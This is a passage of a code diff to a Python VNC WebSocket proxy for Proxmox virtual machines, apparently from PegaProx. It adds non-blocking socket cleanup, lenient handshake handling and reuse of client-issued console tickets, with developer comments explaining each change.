+                f"{'SHORT_OR_EMPTY — middlebox/EDR may be interfering' if _short_session else ''}"
+            )
             
         except Exception as e:
             logging.exception(f"VNC WS handler error: {type(e).__name__}: {e}")
         finally:
+            # MK Apr 2026 — pve_ws.close() is a SYNC call from the websocket-client
+            # library. It runs the TLS close handshake which on a tunneled SSH leg
+            # can block when the far end is gone. If we run it on the event loop,
+            # ALL subsequent VNC handshakes on this server queue behind it (we hit
+            # this in the multi-user concurrency test: 1st session OK, then 5 in
+            # parallel all timeout). Offload to a worker with a short upper bound.
             if pve_ws:
                 try:
-                    pve_ws.close()
-                except:
+                    import asyncio as _aio_close
+                    await _aio_close.wait_for(
+                        _aio_close.to_thread(pve_ws.close), timeout=2.0
+                    )
+                except Exception:
                     pass
+            try:
+                if 'tunnel_endpoint' in locals() and tunnel_endpoint is not None:
+                    tunnel_endpoint.stop()
+            except Exception as _tend:
+                logging.debug(f"[VNC] tunnel cleanup error: {_tend}")
             print(f"{'='*60}\n")
 
     async def main():
@@ -6078,10 +6533,13 @@ def start_vnc_websocket_server(port=5001, ssl_cert=None, ssl_key=None, host='0.0
         
         # NS: added ping keepalive like ssh server has, was causing random disconnects (#92)
         # LW Feb 2026: host='' means all interfaces (asyncio creates IPv4+IPv6 listeners)
+        # MK Apr 2026 (#352): lenient Connection-header recovery for PVE 9.1.8-9 hosts
+        # and middlebox-stripped Upgrade tokens. See pegaprox/utils/ws_lenient.py.
+        from pegaprox.utils.ws_lenient import lenient_process_request as _lpr_vnc
         ws_host = host if host else None
         display_host = host or '0.0.0.0'
         try:
-            async with websockets.serve(vnc_handler, ws_host, port, ssl=ssl_context, ping_interval=20, ping_timeout=10):
+            async with websockets.serve(vnc_handler, ws_host, port, ssl=ssl_context, ping_interval=20, ping_timeout=10, process_request=_lpr_vnc):
                 print(f"VNC WebSocket Server ready on {proto}://{display_host}:{port}", flush=True)
                 server_ready.set()
                 await asyncio.Future()  # Run forever
@@ -6089,7 +6547,7 @@ def start_vnc_websocket_server(port=5001, ssl_cert=None, ssl_key=None, host='0.0
             # Issue #71: IPv6 bind failed, fall back to 0.0.0.0
             if ':' in str(host):
                 print(f"VNC WebSocket: IPv6 bind failed ({bind_err}), falling back to 0.0.0.0", flush=True)
-                async with websockets.serve(vnc_handler, '0.0.0.0', port, ssl=ssl_context, ping_interval=20, ping_timeout=10):
+                async with websockets.serve(vnc_handler, '0.0.0.0', port, ssl=ssl_context, ping_interval=20, ping_timeout=10, process_request=_lpr_vnc):
                     print(f"VNC WebSocket Server ready on {proto}://0.0.0.0:{port}", flush=True)
                     server_ready.set()
                     await asyncio.Future()
@@ -6217,29 +6675,36 @@ def vnc_websocket_proxy(ws, cluster_id, node, vm_type, vmid):
         
         with urllib.request.urlopen(login_req, context=ssl_context, timeout=10) as response:
             login_result = json.loads(response.read().decode('utf-8'))
-        
+
         pve_ticket = login_result['data']['ticket']
         csrf_token = login_result['data']['CSRFPreventionToken']
         print(f"Got PVE ticket")
-        
-        # Step 2: Get VNC ticket
-        print(f"Step 2: Get VNC ticket...")
-        if vm_type == 'qemu':
-            vnc_url = f"https://{host}:8006/api2/json/nodes/{node}/qemu/{vmid}/vncproxy"
+
+        # MK Apr 2026 (#352 follow-up) — single-vncproxy mode. If the JS
+        # already got a vncproxy ticket+port via /console, reuse it so the VNC
+        # password noVNC uses matches the password PVE's vncterm expects. PVE
+        # 9.1.x generates fresh random VNC password per vncproxy call.
+        pve_port_q = request.args.get('pve_port')
+        pve_ticket_q = request.args.get('pve_ticket')
+        if pve_port_q and pve_ticket_q:
+            vnc_ticket = pve_ticket_q
+            port = pve_port_q
+            print(f"Reusing JS-issued vncproxy ticket port={port}")
         else:
-            vnc_url = f"https://{host}:8006/api2/json/nodes/{node}/lxc/{vmid}/vncproxy"
-        
-        vnc_data = urlencode({'websocket': '1'}).encode('utf-8')
-        vnc_req = urllib.request.Request(vnc_url, data=vnc_data, method='POST')
-        vnc_req.add_header('Cookie', f'PVEAuthCookie={pve_ticket}')
-        vnc_req.add_header('CSRFPreventionToken', csrf_token)
-        
-        with urllib.request.urlopen(vnc_req, context=ssl_context, timeout=10) as response:
-            vnc_result = json.loads(response.read().decode('utf-8'))
-        
-        vnc_ticket = vnc_result['data']['ticket']
-        port = vnc_result['data']['port']
-        print(f"Got VNC ticket, port={port}")
+            print(f"Step 2: Get VNC ticket...")
+            if vm_type == 'qemu':
+                vnc_url = f"https://{host}:8006/api2/json/nodes/{node}/qemu/{vmid}/vncproxy"
+            else:
+                vnc_url = f"https://{host}:8006/api2/json/nodes/{node}/lxc/{vmid}/vncproxy"
+            vnc_data = urlencode({'websocket': '1'}).encode('utf-8')
+            vnc_req = urllib.request.Request(vnc_url, data=vnc_data, method='POST')
+            vnc_req.add_header('Cookie', f'PVEAuthCookie={pve_ticket}')
+            vnc_req.add_header('CSRFPreventionToken', csrf_token)
+            with urllib.request.urlopen(vnc_req, context=ssl_context, timeout=10) as response:
+                vnc_result = json.loads(response.read().decode('utf-8'))
+            vnc_ticket = vnc_result['data']['ticket']
+            port = vnc_result['data']['port']
+            print(f"Got VNC ticket, port={port} (no JS pass-through — PVE 9.1.x users may hit issue #352)")
         
         # Step 3: Connect to Proxmox WebSocket
         print(f"Step 3: Connect to Proxmox...")
@@ -6251,14 +6716,16 @@ def vnc_websocket_proxy(ws, cluster_id, node, vm_type, vmid):
             pve_ws_path = f"/api2/json/nodes/{node}/lxc/{vmid}/vncwebsocket?port={port}&vncticket={encoded_vnc_ticket}"
         
         pve_ws_url = f"wss://{host}:8006{pve_ws_path}"
-        
+
         pve_ws = websocket.create_connection(
             pve_ws_url,
             sslopt={"cert_reqs": ssl.CERT_NONE},
             header={"Cookie": f"PVEAuthCookie={pve_ticket}"},
-            timeout=5
+            timeout=VNC_PVE_CONNECT_TIMEOUT
         )
-        
+        # MK Apr 2026 — TCP_NODELAY + keepalive (consolidated helper)
+        _apply_vnc_socket_options(pve_ws.sock)
+
         print(f"✓ Connected!")
         pve_ws.settimeout(0.1)
         
